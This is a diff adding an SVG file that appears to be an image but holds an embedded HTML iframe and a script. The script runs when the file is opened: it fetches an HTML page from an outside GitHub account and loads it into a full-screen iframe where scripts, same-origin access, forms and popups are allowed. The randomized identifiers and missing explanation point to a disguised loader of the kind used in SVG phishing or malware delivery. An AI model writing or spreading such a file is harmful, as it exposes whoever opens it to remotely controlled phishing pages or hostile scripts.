@@ -1,0 +1,37 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="width: 100%; height: 100%; margin: 0; padding: 0;">
+      
+      <!-- h -->
+      <iframe id="nMbQg" style="width: 100%; height: 100%; border: none;" 
+              sandbox="allow-scripts allow-same-origin allow-forms allow-popups">
+      </iframe>
+
+      <script type="text/javascript">
+        <![CDATA[
+        (async function oAobp() {
+          const TARGET_URL = 'https://raw.githubusercontent.com/zaka13alt/sitesinglefile/refs/heads/main/single%5C.html'; 
+          
+          try {
+            // 
+            const response = await fetch(TARGET_URL);
+            
+            if (response.ok) {
+              const CND2n = await response.text();
+              
+              // 
+              const iframe = document.getElementById('nMbQg');
+              iframe.srcdoc = CND2n;
+            } else {
+              console.error('error :', response.status);
+            }
+          } catch (error) {
+            console.error('err', error);
+          }
+        })();
+        ]]>
+      </script>
+    </div>
+  </foreignObject>
+</svg>
+
